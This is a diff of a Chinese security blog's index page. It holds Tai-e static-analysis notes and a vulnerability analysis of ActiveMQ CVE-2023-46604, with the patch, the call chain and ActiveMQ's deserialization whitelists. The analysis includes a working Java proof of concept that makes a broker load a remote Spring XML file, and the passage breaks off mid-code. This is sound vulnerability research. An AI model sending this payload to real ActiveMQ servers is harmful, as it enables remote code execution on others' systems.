+<p>出乎意料的是，只处理了InvokeStatic 静态方法。<br>实际上addCSMethod 知识被当作Method的初始化处理，复杂的都是交由DefaultSolver#processxxx 去处理。调用属于最复杂的。</p>
+<h2 id="4-5-DefaultSolver"><a href="#4-5-DefaultSolver" class="headerlink" title="4.5 DefaultSolver"></a>4.5 DefaultSolver</h2><p>和4.3相同，不过因为重要解释StmtProcessor的需要</p>
+<h3 id="4-3-1-API"><a href="#4-3-1-API" class="headerlink" title="4.3.1 API"></a>4.3.1 API</h3><p>接原4.3.1</p>
+<p>processCallEdge</p>
+<p><img src="/images/pasted-792.png" alt="upload successful"></p>
+<p>processCallEdge</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCallEdge</span><span class="params">(Edge&lt;CSCallSite, CSMethod&gt; edge)</span> &#123;</span><br><span class="line">	<span class="comment">// callGraph 添加调用</span></span><br><span class="line">    <span class="keyword">if</span> (callGraph.addEdge(edge)) &#123;</span><br><span class="line">        <span class="comment">// process new call edge</span></span><br><span class="line">        <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> edge.getCallee();</span><br><span class="line">        <span class="comment">// addCSMethod 分析被调用的Method</span></span><br><span class="line">        addCSMethod(csCallee);</span><br><span class="line">        <span class="keyword">if</span> (edge.getKind() != CallKind.OTHER</span><br><span class="line">                &amp;&amp; !isIgnored(csCallee.getMethod())) &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">callerCtx</span> <span class="operator">=</span> edge.getCallSite().getContext();</span><br><span class="line">            <span class="type">Invoke</span> <span class="variable">callSite</span> <span class="operator">=</span> edge.getCallSite().getCallSite();</span><br><span class="line">            <span class="type">Context</span> <span class="variable">calleeCtx</span> <span class="operator">=</span> csCallee.getContext();</span><br><span class="line">            <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> csCallee.getMethod();</span><br><span class="line">            <span class="type">InvokeExp</span> <span class="variable">invokeExp</span> <span class="operator">=</span> callSite.getInvokeExp();</span><br><span class="line">            <span class="comment">// pass arguments to parameters</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; invokeExp.getArgCount(); ++i) &#123;</span><br><span class="line">                <span class="type">Var</span> <span class="variable">arg</span> <span class="operator">=</span> invokeExp.getArg(i);</span><br><span class="line">                <span class="keyword">if</span> (propTypes.isAllowed(arg)) &#123;</span><br><span class="line">                    <span class="type">Var</span> <span class="variable">param</span> <span class="operator">=</span> callee.getIR().getParam(i);</span><br><span class="line">                    <span class="type">CSVar</span> <span class="variable">argVar</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, arg);</span><br><span class="line">                    <span class="type">CSVar</span> <span class="variable">paramVar</span> <span class="operator">=</span> csManager.getCSVar(calleeCtx, param);</span><br><span class="line">                    <span class="comment">// 对于每一个参数</span></span><br><span class="line">                    <span class="comment">// 增加一条调用者参数到method参数的PFG边</span></span><br><span class="line">                    addPFGEdge(argVar, paramVar, FlowKind.PARAMETER_PASSING);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// pass results to LHS variable</span></span><br><span class="line">            <span class="type">Var</span> <span class="variable">lhs</span> <span class="operator">=</span> callSite.getResult();</span><br><span class="line">            <span class="keyword">if</span> (lhs != <span class="literal">null</span> &amp;&amp; propTypes.isAllowed(lhs)) &#123;</span><br><span class="line">                <span class="type">CSVar</span> <span class="variable">csLHS</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, lhs);</span><br><span class="line">                <span class="keyword">for</span> (Var ret : callee.getIR().getReturnVars()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (propTypes.isAllowed(ret)) &#123;</span><br><span class="line">                        <span class="type">CSVar</span> <span class="variable">csRet</span> <span class="operator">=</span> csManager.getCSVar(calleeCtx, ret);</span><br><span class="line">                        <span class="comment">// 结果和调用callsite左值关联，添加一条PFG边</span></span><br><span class="line">                        addPFGEdge(csRet, csLHS, FlowKind.RETURN);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        plugin.onNewCallEdge(edge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-5-CompositePlugin"><a href="#4-5-CompositePlugin" class="headerlink" title="4.5 CompositePlugin"></a>4.5 CompositePlugin</h2><p>以上只是最基础的指针分析的流程，污点分析、反射分析，这些都是通过插件实现的，在pta.plugin下面</p>
+<ul>
+<li>exception</li>
+<li>invokedynamic</li>
+<li>natives</li>
+<li>reflection</li>
+<li>taint<br>这些以后再单独的详细分析吧。</li>
+</ul>
+<h1 id="0x5-参考"><a href="#0x5-参考" class="headerlink" title="0x5 参考"></a>0x5 参考</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://static-analysis.cuijiacai.com/06-pta-intro/">6 指针分析-引入</a></li>
+<li><a target="_blank" rel="noopener" href="https://wxweven.win/2017/09/15/JVM-invokespecial%E5%92%8Cinvokevirtual/">通过实例一行一行分析JVM的invokespecial和invokevirtual指令</a></li>
+<li><a target="_blank" rel="noopener" href="https://cs.nju.edu.cn/yueli/papers/crad2023.pdf">Java 指针分析综述</a></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Tai-e</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/静态分析//" class="article-tag-list-link color5">静态分析</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
         
-          <a class="article-more-a" href="/2021/11/01/CodeQL-CVE-2021-2471/#more">more >></a>
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-Tai-e-分析之IR" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/10/08/Tai-e-%E5%88%86%E6%9E%90%E4%B9%8BIR/">Tai-e 分析之IR</a>
+    </h1>
+  
+
+        
+        <a href="/2023/10/08/Tai-e-%E5%88%86%E6%9E%90%E4%B9%8BIR/" class="archive-article-date">
+  	<time datetime="2023-10-08T09:38:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>两位老师在介绍Tai-e的时候，都会提到Tai-e的IR设计，会比Soot的更直观，这里具体看看Tai-e的IR设计及实现。</p>
+<p>还是先给个老师演示Tai-e的IR例子。</p>
+<h1 id="0x01-Tai-e-IR"><a href="#0x01-Tai-e-IR" class="headerlink" title="0x01 Tai-e IR"></a>0x01 Tai-e IR</h1><h2 id="1-1-Soot-VS-Tai-e"><a href="#1-1-Soot-VS-Tai-e" class="headerlink" title="1.1 Soot VS Tai-e"></a>1.1 Soot VS Tai-e</h2><p><img src="/images/pasted-738.png" alt="upload successful"></p>
+        
+          <a class="article-more-a" href="/2023/10/08/Tai-e-%E5%88%86%E6%9E%90%E4%B9%8BIR/#more">more >></a>
         
       
 
@@ -521,24 +793,182 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Tai-e</a>
         		</li>
-      		 
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Mysql</a>
+        			<a href="/categories/静态分析//" class="article-tag-list-link color5">静态分析</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Fabric</a>
-        		</li>
-      		 
+      		
+		</ul>
+	</div>
+
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
+    <article id="post-ActiveMQ CVE-2023-46604漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/09/20/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ActiveMQ CVE-2023-46604漏洞分析</a>
+    </h1>
+  
+
+        
+        <a href="/2023/09/20/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2023-09-20T12:56:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ActiveMQ 的RCE 漏洞，直接从61616 端口默认协议上可触发，影响不小。</p>
+<p>偷懒了当时只是验证了下没写分析，先在还得从头开始捡。</p>
+<h1 id="0x01-补丁分析"><a href="#0x01-补丁分析" class="headerlink" title="0x01 补丁分析"></a>0x01 补丁分析</h1><p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p>
+<p><img src="/images/pasted-826.png" alt="upload successful"></p>
+<p>分析出补丁位置不难，经典的org.springframework.context.support.ClassPathXmlApplicationContext 利用场景，以前出过几次，印象中最近的是浅蓝的postgresql 用的就是这个sink利用链。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>已知sink点为 BaseDataStreamMarshaller#createThrowable，路径在<code>org.apache.activemq.openwire.v12</code>，其中openwire有不同版本，v开头，这里已v12 为例，往上回溯</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BaseDataStreamMarshaller#createThrowable</span><br><span class="line">	BaseDataStreamMarshaller#tightUnmarsalThrowable</span><br><span class="line">	BaseDataStreamMarshaller#looseUnmarsalThrowable</span><br><span class="line">    	MessageAckMarshaller#tightUnmarshal</span><br><span class="line">        ConnectionErrorMarshaller#tightUnmarshal</span><br><span class="line">        ExceptionResponseMarshaller#tightUnmarshal</span><br><span class="line">        	OpenWireFormat#doUnmarshal</span><br><span class="line">            	OpenWireFormat#unmarshal(ByteSequence sequence)</span><br><span class="line">                OpenWireFormat#unmarshal(DataInput dis)</span><br><span class="line">            OpenWireFormat#tightUnmarshalNestedObject</span><br></pre></td></tr></table></figure>
+
+<p>其实跟踪到这里已经ok了，搭配上断点调试，已经可以定位出漏洞触发路径。</p>
+<h2 id="2-1-run-gt-sink链"><a href="#2-1-run-gt-sink链" class="headerlink" title="2.1 run-&gt;sink链"></a>2.1 run-&gt;sink链</h2><p>后续的触发路径还有很多，这里以tcp为例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OpenWireFormat#unmarshal</span><br><span class="line">	TcpTransport#readCommand</span><br><span class="line">    	TcpTransport#doRun</span><br><span class="line">        	TcpTransport#run</span><br></pre></td></tr></table></figure>
+
+<p>TcpTransport 是个Runable 类，run 是其接口，那么只要启动TcpTransport线程，那么到sink链就通了</p>
+<p><img src="/images/pasted-711.png" alt="upload successful"></p>
+<h2 id="2-2-source-gt-start链"><a href="#2-2-source-gt-start链" class="headerlink" title="2.2 source-&gt;start链"></a>2.2 source-&gt;start链</h2><p>从source 继续往上推</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socket.getInputStream</span><br><span class="line">	TcpTransport#initializeStreams</span><br><span class="line">		TcpTransport#connect</span><br><span class="line">        	TcpTransport#doStart</span><br><span class="line">				TransportThreadSupport#doStart                </span><br></pre></td></tr></table></figure>
+
+<p>TransportThreadSupport#doStart</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doStart</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    runner = <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="literal">null</span>, <span class="built_in">this</span>, <span class="string">&quot;ActiveMQ Transport: &quot;</span> + toString(), stackSize);</span><br><span class="line">    runner.setDaemon(daemon);</span><br><span class="line">    runner.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>TcpTransport#doStart</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TcpTransport</span> <span class="keyword">extends</span> <span class="title class_">TransportThreadSupport</span> <span class="keyword">implements</span> <span class="title class_">Transport</span>, Service, Runnable &#123;</span><br><span class="line">	TcpTransport <span class="keyword">extends</span> <span class="title class_">TransportThreadSupport</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doStart</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        connect();</span><br><span class="line">        stoppedLatch.set(<span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="built_in">super</span>.doStart();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-start-gt-run"><a href="#2-3-start-gt-run" class="headerlink" title="2.3 start -&gt; run"></a>2.3 start -&gt; run</h2><blockquote>
+<p>疑问：<br>Java thread#start 是在JNI实现上，实际调用的是run 接口，这在代码AST 上是无法追踪的，如何完善这一块？</p>
+</blockquote>
+<h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="3-1-环境"><a href="#3-1-环境" class="headerlink" title="3.1 环境"></a>3.1 环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim bin/env</span><br><span class="line">ACTIVEMQ_DEBUG_OPTS=<span class="string">&quot;-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005&quot;</span></span><br><span class="line">$ ./bin/activemq</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-POC"><a href="#3-2-POC" class="headerlink" title="3.2 POC"></a>3.2 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExceptionResponseMarshallerPoc</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BROKER_URL</span> <span class="operator">=</span> <span class="string">&quot;tcp://localhost:61616&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Boolean</span> <span class="variable">NON_TRANSACTED</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">TIMEOUT</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String ip=<span class="string">&quot;&quot;</span>; <span class="comment">//服务器端ip地址</span></span><br><span class="line">        <span class="type">int</span> port=<span class="number">61616</span>; <span class="comment">//端口号</span></span><br><span class="line">        Socket sck=<span class="keyword">new</span> <span class="title class_">Socket</span>(ip,port);</span><br><span class="line">        <span class="comment">//2.传输内容</span></span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        out = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">        out.writeInt(<span class="number">32</span>);</span><br><span class="line">        out.writeByte(<span class="number">31</span>);</span><br><span class="line">        out.writeInt(<span class="number">1</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeInt(<span class="number">1</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        out.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        out.writeUTF(<span class="string">&quot;http://127.0.0.1/spring_poc.xml&quot;</span>);</span><br><span class="line">        out.close();</span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>)));</span><br><span class="line">        OutputStream os=sck.getOutputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> in.available();</span><br><span class="line">        <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">        in.readFully(buf);</span><br><span class="line">        os.write(buf);</span><br><span class="line">        in.close();</span><br><span class="line">        sck.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="0x04-横向拓展"><a href="#0x04-横向拓展" class="headerlink" title="0x04 横向拓展"></a>0x04 横向拓展</h1><h2 id="4-1-其他协议"><a href="#4-1-其他协议" class="headerlink" title="4.1 其他协议"></a>4.1 其他协议</h2><p>activemq 有其他协议，大家往往关注的是默认的61616 tcp协议，其实从原理分析过程来看，其他协议也存在问题。</p>
+<p>例如udp 协议上也有问题：<br><img src="/images/pasted-841.png" alt="upload successful"></p>
+<p>不过最终的修复点是在sink点上，对newInstance 增加了过滤，因此这些路径也都被修复了。</p>
+<h2 id="4-2-安全手段"><a href="#4-2-安全手段" class="headerlink" title="4.2 安全手段"></a>4.2 安全手段</h2><h3 id="4-2-1-反序列化安全"><a href="#4-2-1-反序列化安全" class="headerlink" title="4.2.1 反序列化安全"></a>4.2.1 反序列化安全</h3><h4 id="4-2-1-1-InputStream"><a href="#4-2-1-1-InputStream" class="headerlink" title="4.2.1.1 InputStream"></a>4.2.1.1 InputStream</h4><h5 id="MessageDatabaseObjectInputStream"><a href="#MessageDatabaseObjectInputStream" class="headerlink" title="MessageDatabaseObjectInputStream"></a>MessageDatabaseObjectInputStream</h5><p>MessageDatabaseObjectInputStream</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MessageDatabaseObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MessageDatabaseObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(desc.getName().startsWith(<span class="string">&quot;java.lang.&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;com.thoughtworks.xstream&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;java.util.&quot;</span>)</span><br><span class="line">                || desc.getName().length() &gt; <span class="number">2</span> &amp;&amp; desc.getName().substring(<span class="number">2</span>).startsWith(<span class="string">&quot;java.util.&quot;</span>) <span class="comment">// Allow arrays</span></span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;org.apache.activemq.&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>白名单模式</li>
+<li>可能还有操作空间的只有xstream/activemq 这几个类</li>
+</ul>
+<h5 id="ClassLoadingAwareObjectInputStream"><a href="#ClassLoadingAwareObjectInputStream" class="headerlink" title="ClassLoadingAwareObjectInputStream"></a>ClassLoadingAwareObjectInputStream</h5><p>ClassLoadingAwareObjectInputStream.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoadingAwareObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] serializablePackages;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        serializablePackages = System.getProperty(<span class="string">&quot;org.apache.activemq.SERIALIZABLE_PACKAGES&quot;</span>,<span class="string">&quot;java.lang,org.apache.activemq,org.fusesource.hawtbuf,com.thoughtworks.xstream.mapper&quot;</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkSecurity</span><span class="params">(Class clazz)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (trustAllPackages() || clazz.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">Package</span> <span class="variable">thePackage</span> <span class="operator">=</span> clazz.getPackage();</span><br><span class="line">    <span class="keyword">if</span> (thePackage != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String trustedPackage : getTrustedPackages()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thePackage.getName().equals(trustedPackage) || thePackage.getName().startsWith(trustedPackage + <span class="string">&quot;.&quot;</span>)) &#123;</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Forbidden &quot;</span> + clazz + <span class="string">&quot;! This class is not trusted to be serialized as ObjectMessage payload. Please take a look at http://activemq.apache.org/objectmessage.html for more information on how to configure trusted classes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="SubSelectorClassObjectInputStream"><a href="#SubSelectorClassObjectInputStream" class="headerlink" title="SubSelectorClassObjectInputStream"></a>SubSelectorClassObjectInputStream</h5><p>SubQueueSelectorCacheBroker</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SubSelectorClassObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SubSelectorClassObjectInputStream</span><span class="params">(InputStream is)</span> 